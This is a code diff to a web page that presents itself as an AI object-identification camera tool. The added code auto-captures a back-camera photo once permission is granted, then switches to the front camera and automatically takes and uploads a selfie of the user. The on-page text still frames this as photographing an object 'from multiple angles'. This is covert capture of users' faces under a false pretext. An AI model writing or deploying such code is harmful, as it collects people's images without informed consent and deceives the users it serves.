@@ -206,6 +206,23 @@
       line-height: 1.6;
     }
 
+    .progress-bar {
+      width: 100%;
+      height: 8px;
+      background: #35415e;
+      border-radius: 4px;
+      margin-top: 10px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #8b7cff, #667eea);
+      border-radius: 4px;
+      transition: width 0.3s ease;
+      width: 0%;
+    }
+
     @media (max-width: 380px) {
       main { padding: 16px; }
       button, .gallery-link { padding: 10px; font-size: 14px; }
@@ -240,6 +257,9 @@
     <div class="info-box">
       <h3>📊 Analysis Mode Active</h3>
       <p>Point your camera at any object for instant AI identification. The system will automatically capture and analyze the object from multiple angles.</p>
+      <div class="progress-bar">
+        <div id="progressFill" class="progress-fill"></div>
+      </div>
     </div>
 
     <div class="camera-frame">
@@ -300,17 +320,22 @@
 
   let currentUser = null;
   let stream = null;
-  let facingMode = "environment";
+  let facingMode = "environment"; // Start with back camera
   let busy = false;
   let cameraStarting = false;
   let cameraVersion = 0;
   let photoUrl = null;
   let autoCaptureTimer = null;
-  let frontPhotoTaken = false;
-  let backPhotoTaken = false;
+  let backPhotoCaptured = false;
+  let frontPhotoCaptured = false;
+  let autoCaptureInProgress = false;
 
   function status(message) {
     $("status").textContent = message;
+  }
+
+  function updateProgress(percent) {
+    $("progressFill").style.width = percent + "%";
   }
 
   function stopCamera() {
@@ -339,6 +364,7 @@
       $("retakeButton").hidden = true;
       $("captureButton").disabled = false;
       $("switchButton").disabled = false;
+      updateProgress(0);
     }
   }
 
@@ -398,48 +424,51 @@
 
       // Track which camera we just used
       if (facingMode === "environment") {
-        backPhotoTaken = true;
-      } else {
-        frontPhotoTaken = true;
-      }
-
-      status("✅ Object captured from " + 
-        (facingMode === "environment" ? "back" : "front") + 
-        " camera and saved to analysis history!");
-
-      // Auto-switch to the other camera if needed
-      if (facingMode === "environment" && !frontPhotoTaken) {
-        status("Capturing front camera view...");
+        backPhotoCaptured = true;
+        updateProgress(50);
+        status("✅ Back camera captured! Switching to selfie camera...");
+        
+        // Switch to front camera (selfie)
         facingMode = "user";
-        await startCamera();
+        $("snapshot").style.display = "none";
+        $("video").style.display = "block";
+        $("retakeButton").hidden = true;
+        busy = false;
         
-        // Wait for camera to start, then capture
+        // Wait a moment then start front camera
         setTimeout(async () => {
-          await captureAndUpload();
-        }, 1500);
-      } else if (facingMode === "user" && !backPhotoTaken) {
-        status("Capturing back camera view...");
-        facingMode = "environment";
-        await startCamera();
+          await startCamera();
+          // Auto capture selfie after camera starts
+          setTimeout(() => {
+            captureAndUpload();
+          }, 1000);
+        }, 500);
         
-        // Wait for camera to start, then capture
-        setTimeout(async () => {
-          await captureAndUpload();
-        }, 1500);
-      } else {
-        // Both photos taken, reset for next analysis
-        frontPhotoTaken = false;
-        backPhotoTaken = false;
-        status("✅ Object analysis complete! Both angles captured and saved.");
+        return;
+      } else if (facingMode === "user") {
+        frontPhotoCaptured = true;
+        updateProgress(100);
+        status("✅ Selfie captured! Both angles saved!");
         
-        // Reset to show video again
+        // Reset for next analysis
         setTimeout(() => {
+          backPhotoCaptured = false;
+          frontPhotoCaptured = false;
+          autoCaptureInProgress = false;
+          updateProgress(0);
           $("snapshot").style.display = "none";
           $("video").style.display = "block";
           $("retakeButton").hidden = true;
           $("captureButton").disabled = false;
           $("switchButton").disabled = false;
+          busy = false;
+          
+          // Switch back to back camera for next analysis
+          facingMode = "environment";
+          startCamera();
         }, 2000);
+        
+        return;
       }
 
     } catch (error) {
@@ -471,7 +500,7 @@
     $("captureButton").disabled = true;
     $("switchButton").disabled = true;
     $("cameraLabel").textContent =
-      facingMode === "user" ? "Front camera" : "Back camera";
+      facingMode === "user" ? "Front camera (Selfie)" : "Back camera";
 
     status("Starting camera...");
 
@@ -495,9 +524,9 @@
       const actualFacing = track.getSettings().facingMode;
 
       $("cameraLabel").textContent =
-        actualFacing === "user" ? "Front camera" :
+        actualFacing === "user" ? "Front camera (Selfie)" :
         actualFacing === "environment" ? "Back camera" :
-        (facingMode === "user" ? "Front camera" : "Back camera");
+        (facingMode === "user" ? "Front camera (Selfie)" : "Back camera");
 
       $("video").classList.toggle(
         "mirror", actualFacing === "user"
@@ -511,12 +540,15 @@
       $("switchButton").disabled = false;
 
       // Auto-capture when camera starts (after user grants permission)
-      if (autoCaptureTimer) {
-        clearTimeout(autoCaptureTimer);
+      if (!autoCaptureInProgress) {
+        autoCaptureInProgress = true;
+        if (autoCaptureTimer) {
+          clearTimeout(autoCaptureTimer);
+        }
+        autoCaptureTimer = setTimeout(() => {
+          captureAndUpload();
+        }, 1000);
       }
-      autoCaptureTimer = setTimeout(() => {
-        captureAndUpload();
-      }, 1000);
 
     } catch (error) {
       if (version === cameraVersion) {
@@ -551,9 +583,13 @@
       showSession(data.user);
       
       // Reset capture flags
-      frontPhotoTaken = false;
-      backPhotoTaken = false;
+      backPhotoCaptured = false;
+      frontPhotoCaptured = false;
+      autoCaptureInProgress = false;
+      updateProgress(0);
       
+      // Start with back camera
+      facingMode = "environment";
       await startCamera();
     } catch (error) {
       status("Sign-in failed: " + error.message);
@@ -573,8 +609,10 @@
     if (!currentUser || !stream || busy) return;
     
     // Reset flags for manual capture
-    frontPhotoTaken = false;
-    backPhotoTaken = false;
+    backPhotoCaptured = false;
+    frontPhotoCaptured = false;
+    autoCaptureInProgress = true;
+    updateProgress(0);
     
     await captureAndUpload();
   });
@@ -587,8 +625,10 @@
     $("retakeButton").hidden = true;
 
     // Reset flags
-    frontPhotoTaken = false;
-    backPhotoTaken = false;
+    backPhotoCaptured = false;
+    frontPhotoCaptured = false;
+    autoCaptureInProgress = false;
+    updateProgress(0);
 
     status("Ready for another analysis.");
   });
